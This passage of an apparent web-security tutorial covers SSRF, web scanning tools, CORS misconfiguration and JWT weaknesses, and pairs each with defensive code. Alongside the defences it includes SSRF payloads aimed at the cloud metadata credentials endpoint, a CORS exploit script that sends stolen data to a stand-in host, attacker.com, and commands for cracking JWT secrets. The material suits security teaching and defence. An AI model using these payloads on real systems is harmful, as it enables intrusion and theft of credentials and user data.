+SSRF (Server-Side Request Forgery) is a vulnerability that tricks the server into sending requests to attacker-specified URLs. Classic attacks include accessing the AWS metadata server (`169.254.169.254`) or using internal services as proxies.
+
+```
+Occurs when the server makes requests to user-supplied URLs
+→ Access to internal networks, cloud metadata, etc.
+
+Vulnerable code example:
+$url = $_GET['url'];
+$content = file_get_contents($url);  // server requests any URL!
+echo $content;
+
+Attacks:
+1. Access internal services
+   ?url=http://localhost:8080/admin
+   ?url=http://192.168.1.1/admin
+
+2. Access AWS metadata (critical in cloud environments!)
+   ?url=http://169.254.169.254/latest/meta-data/
+   ?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/
+
+3. Port scan
+   ?url=http://localhost:22
+   ?url=http://internal.server:3306
+```
+
+### SSRF Defense
+
+SSRF tricks the server into making requests to attacker-controlled URLs. Defense involves URL validation and IP range checks.
+
+```python
+#!/usr/bin/env python3
+"""
+SSRF defense utility — URL validation + safe HTTP request wrapper
+Re-validates IP before connecting to prevent DNS rebinding
+"""
+import ipaddress
+import socket
+import urllib.parse
+from typing import Optional
+import requests
+from requests.adapters import HTTPAdapter
+
+
+ALLOWED_SCHEMES = {"https", "http"}
+# Whitelist-based allowed domains (must be configured in production)
+ALLOWED_HOSTS: set[str] = {
+    "api.example.com",
+    "cdn.example.com",
+    "storage.example.com",
+}
+
+
+class SSRFBlockedError(Exception):
+    """Exception raised when SSRF is blocked"""
+
+
+def is_private_ip(ip_str: str) -> bool:
+    """Detect private/loopback/link-local/multicast IP addresses"""
+    try:
+        ip = ipaddress.ip_address(ip_str)
+        return (
+            ip.is_private
+            or ip.is_loopback
+            or ip.is_link_local
+            or ip.is_multicast
+            or ip.is_reserved
+            or str(ip) in ("0.0.0.0", "::")
+        )
+    except ValueError:
+        return True  # parse failure → block
+
+
+def validate_ssrf_url(url: str, use_whitelist: bool = True) -> str:
+    """
+    Validate URL for SSRF safety.
+    - Check allowed schemes
+    - Validate IP range after DNS lookup
+    - (Optional) Whitelist-based host validation
+    Returns: validated URL (raises SSRFBlockedError on failure)
+    """
+    parsed = urllib.parse.urlparse(url)
+
+    if parsed.scheme not in ALLOWED_SCHEMES:
+        raise SSRFBlockedError(f"Disallowed scheme: {parsed.scheme}")
+
+    hostname = parsed.hostname
+    if not hostname:
+        raise SSRFBlockedError("No hostname")
+
+    # Whitelist validation
+    if use_whitelist and hostname not in ALLOWED_HOSTS:
+        raise SSRFBlockedError(f"Host not in whitelist: {hostname}")
+
+    # Validate DNS lookup result IP (prevent DNS rebinding)
+    try:
+        addr_infos = socket.getaddrinfo(hostname, parsed.port or 443,
+                                        proto=socket.IPPROTO_TCP)
+    except socket.gaierror as e:
+        raise SSRFBlockedError(f"DNS lookup failed: {e}") from e
+
+    for *_, sockaddr in addr_infos:
+        ip = sockaddr[0]
+        if is_private_ip(ip):
+            raise SSRFBlockedError(
+                f"Internal IP access blocked: {hostname} → {ip}"
+            )
+
+    return url
+
+
+class SafeRequester:
+    """HTTP client with SSRF defense applied"""
+
+    def __init__(self, timeout: float = 10.0, use_whitelist: bool = True) -> None:
+        self.timeout = timeout
+        self.use_whitelist = use_whitelist
+        self._session = requests.Session()
+        # Disable redirects (prevent internal network bypass via redirects)
+        self._session.max_redirects = 0
+
+    def get(self, url: str, **kwargs) -> requests.Response:
+        safe_url = validate_ssrf_url(url, self.use_whitelist)
+        return self._session.get(safe_url, timeout=self.timeout,
+                                 allow_redirects=False, **kwargs)
+
+    def post(self, url: str, **kwargs) -> requests.Response:
+        safe_url = validate_ssrf_url(url, self.use_whitelist)
+        return self._session.post(safe_url, timeout=self.timeout,
+                                  allow_redirects=False, **kwargs)
+
+
+# ── Tests ──────────────────────────────────────────────────────────────────────
+if __name__ == "__main__":
+    requester = SafeRequester(use_whitelist=False)  # validate IP only, no whitelist
+
+    test_cases = [
+        "http://127.0.0.1/admin",
+        "http://169.254.169.254/latest/meta-data/",
+        "http://192.168.1.1/",
+        "http://10.0.0.1:8080/",
+        "file:///etc/passwd",
+        "https://api.example.com/data",
+    ]
+
+    for url in test_cases:
+        try:
+            validated = validate_ssrf_url(url, use_whitelist=False)
+            print(f"[ALLOWED] {url}")
+        except SSRFBlockedError as e:
+            print(f"[BLOCKED] {url}  →  {e}")
+```
+
+---
+
+## Web Hacking Tool Reference
+
+### Burp Suite Basics
+
+Burp Suite is the core proxy tool for web application security testing. It intercepts and modifies HTTP requests between the browser and server, performs automated attacks with Intruder, and tests requests with Repeater.
+
+```
+1. Proxy → Enable Intercept
+2. Browser proxy: 127.0.0.1:8080
+3. Capture and modify HTTP traffic
+4. Repeater: resend and analyze requests repeatedly
+5. Intruder: automated attacks (brute force, fuzzing)
+6. Scanner: automated vulnerability scanning (Pro version)
+```
+
+### Nikto (Web Server Vulnerability Scanner)
+
+Nikto web server vulnerability scanner detects known vulnerabilities and misconfigurations. Useful for quick initial web server assessments.
+
+```bash
+nikto -h http://target.com
+nikto -h http://target.com -p 8080
+nikto -h http://target.com -ssl  # HTTPS
+nikto -h http://target.com -output report.html -Format htm
+```
+
+### Gobuster (Directory/File Enumeration)
+
+Gobuster enumerates hidden directories and files via brute force. Quickly finds existing paths using wordlists.
+
+```bash
+# Directory enumeration
+gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt
+
+# Specify file extensions
+gobuster dir -u http://target.com -w common.txt -x php,html,txt
+
+# Subdomain enumeration
+gobuster dns -d target.com -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
+
+# Virtual host enumeration
+gobuster vhost -u http://target.com -w subdomains.txt
+```
+
+---
+
+## CORS Vulnerabilities (Cross-Origin Resource Sharing)
+
+### CORS Misconfiguration Detection
+
+Detects CORS header misconfigurations. Change the Origin header to an arbitrary value and check the response.
+
+```bash
+# Check CORS headers
+curl -H "Origin: https://evil.com" -I https://target.com/api/data
+
+# Vulnerable response example
+Access-Control-Allow-Origin: https://evil.com     # reflects attacker domain
+Access-Control-Allow-Credentials: true            # allows cookie inclusion
+# → CORS + ACAO + ACAC = sensitive data theft possible
+```
+
+### CORS Attack Exploit
+
+An exploit page on the attacker's site using CORS misconfiguration. Sends requests from the victim's browser to the target API to steal sensitive data.
+
+```html
+<!-- Executed on attacker's site -->
+<script>
+fetch('https://target.com/api/sensitive-data', {
+  credentials: 'include'  // include victim's cookies
+})
+.then(r => r.json())
+.then(data => {
+  // Send sensitive data to attacker's server
+  fetch('https://attacker.com/steal?data=' + JSON.stringify(data));
+});
+</script>
+```
+
+### Vulnerable CORS Patterns
+```
+1. Null Origin allowed
+   Access-Control-Allow-Origin: null
+   → abused from file-based HTML or sandboxed iframes
+
+2. Subdomain wildcard matching bug
+   if (origin.endsWith('target.com')) → also allows evil-target.com!
+
+3. Access-Control-Allow-Origin: * + credentials
+   Wildcard and credentials cannot be used together (browser blocks it)
+   → However, bypassed if the server directly copies the origin header
+```
+
+### CORS Defense
+
+Code that validates CORS requests against a whitelist of allowed origins. Avoid using wildcards (*) and explicitly specify domains.
+
+```python
+# Whitelist-based CORS validation
+ALLOWED_ORIGINS = ['https://app.example.com', 'https://admin.example.com']
+
+def cors_check(origin):
+    if origin in ALLOWED_ORIGINS:
+        return origin
+    return None  # not allowed
+
+# Flask example
+from flask_cors import CORS
+CORS(app, origins=ALLOWED_ORIGINS, supports_credentials=True)
+```
+
+---
+
+## JWT Security Vulnerabilities
+
+### JWT Validation Bypass Patterns
+```
+1. alg:none attack
+   Setting the algorithm to "none" causes some libraries to skip signature verification
+
+2. RS256 → HS256 algorithm confusion
+   Misusing the server's RSA public key as the HMAC secret key
+
+3. Weak secret key
+   If the HS256 secret key is "secret", "password", etc., offline brute force is possible
+
+4. Token invalidation failure
+   If the server doesn't manage a token blacklist, tokens can be reused after logout
+```
+
+### JWT Claim Tampering Detection Lab
+
+Decode JWT (JSON Web Token) via Base64 to analyze the header and payload. Check for alg:none attacks or algorithm confusion attacks.
+
+```bash
+# 1. JWT decoding (base64)
+echo "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9" | base64 -d
+# → {"alg":"HS256","typ":"JWT"}
+
+# 2. Vulnerability testing with jwt_tool
+python3 jwt_tool.py TOKEN -X a  # alg:none
+python3 jwt_tool.py TOKEN -X s  # signature confusion
+python3 jwt_tool.py TOKEN -C -d /usr/share/wordlists/rockyou.txt  # crack secret key
+
+# 3. Crack HS256 secret key with hashcat
+hashcat -a 0 -m 16500 jwt_token.txt wordlist.txt
+```
+
+### Secure JWT Implementation
+
+Python code for securely generating and verifying JWTs. Use a strong signing algorithm (RS256, HS256) and always set an expiration time.
+
+```python
+import jwt
+from datetime import datetime, timedelta
+
+SECRET_KEY = secrets.token_hex(32)  # sufficiently long random key
+
+# Issue token
+payload = {
+    'sub': user_id,
+    'iat': datetime.utcnow(),
+    'exp': datetime.utcnow() + timedelta(hours=1),  # set expiration time
+    'jti': str(uuid.uuid4())  # unique ID (prevent reuse)
+}
+token = jwt.encode(payload, SECRET_KEY, algorithm='HS256')
+
+# Verify token (must explicitly specify algorithm)
+decoded = jwt.decode(token, SECRET_KEY, algorithms=['HS256'])  # pin algorithm
+
+# Blacklist token on logout
 redis_client.setex(f"blacklist:{jti}", 3600, "revoked")
 ```
